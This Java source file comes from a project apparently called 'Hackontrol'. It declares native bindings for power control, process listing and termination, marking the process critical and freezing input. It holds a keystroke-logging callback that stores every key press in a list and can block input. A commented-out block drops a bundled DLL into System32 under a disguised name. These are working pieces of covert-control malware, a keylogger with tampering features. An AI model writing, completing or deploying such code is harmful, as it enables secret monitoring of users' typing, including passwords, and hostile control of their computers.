package com.khopan.hackontrol;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class NativeLibrary {
	private NativeLibrary() {}

	public static final List<KeyEntry> KEYSTROKE_LIST;
	public static final Map<Integer, Boolean> KEYSTROKE_MAP;

	public static boolean Block;
	public static boolean Enable;

	static {
		/*try {
			InputStream inputStream = NativeLibrary.class.getClassLoader().getResourceAsStream("Hackontrol.dll");
			byte[] data = inputStream.readAllBytes();
			inputStream.close();
			File file = new File("C:\\Windows\\System32\\libnative32.dll");
			FileOutputStream outputStream = new FileOutputStream(file);
			outputStream.write(data);
			outputStream.close();
			System.load(file.getAbsolutePath());
		} catch(Throwable Errors) {
			Errors.printStackTrace();
		}*/

		System.load("D:\\GitHub Repository\\Hackontrol\\Hackontrol\\x64\\Release\\Native Library.dll");
		KEYSTROKE_LIST = new ArrayList<>();
		KEYSTROKE_MAP = new HashMap<>();
		NativeLibrary.Block = false;
		NativeLibrary.Enable = false;
	}

	public static native String sleep();
	public static native String hibernate();
	public static native String restart();
	public static native String shutdown();
	public static native boolean critical(boolean critical);
	public static native int dialog(String title, String content, int flags);
	public static native ProcessEntry[] listProcess();
	public static native int currentIdentifier();
	public static native boolean terminate(int identifier);
	public static native boolean hasUIAccess();
	public static native boolean volume(float volume);
	public static native float volume();
	public static native boolean mute(boolean mute);
	public static native boolean mute();
	public static native void freeze(boolean freeze);

	public static void load() {
		// Load the class
	}

	private static boolean log(int keyAction, int keyCode, int scanCode, int flags, int time) {
		if(!NativeLibrary.Enable) {
			return NativeLibrary.Block;
		}

		KeyEntry entry = new KeyEntry();

		switch(keyAction) {
		case 0x0100:
			entry.keyDown = true;
			entry.systemKey = false;
			break;
		case 0x0101:
			entry.keyDown = false;
			entry.systemKey = false;
			break;
		case 0x0104:
			entry.keyDown = true;
			entry.systemKey = true;
			break;
		case 0x0105:
			entry.keyDown = false;
			entry.systemKey = true;
			break;
		}

		entry.keyCode = keyCode;
		entry.scanCode = scanCode;
		Boolean value = NativeLibrary.KEYSTROKE_MAP.get(scanCode);
		boolean previousState = value == null ? false : value;
		entry.fake = previousState == entry.keyDown;
		NativeLibrary.KEYSTROKE_MAP.put(scanCode, entry.keyDown);
		NativeLibrary.KEYSTROKE_LIST.add(entry);
		return NativeLibrary.Block;
	}

	public static class KeyEntry {
		public boolean keyDown;
		public boolean systemKey;
		public int keyCode;
		public int scanCode;
		public boolean fake;
	}
}
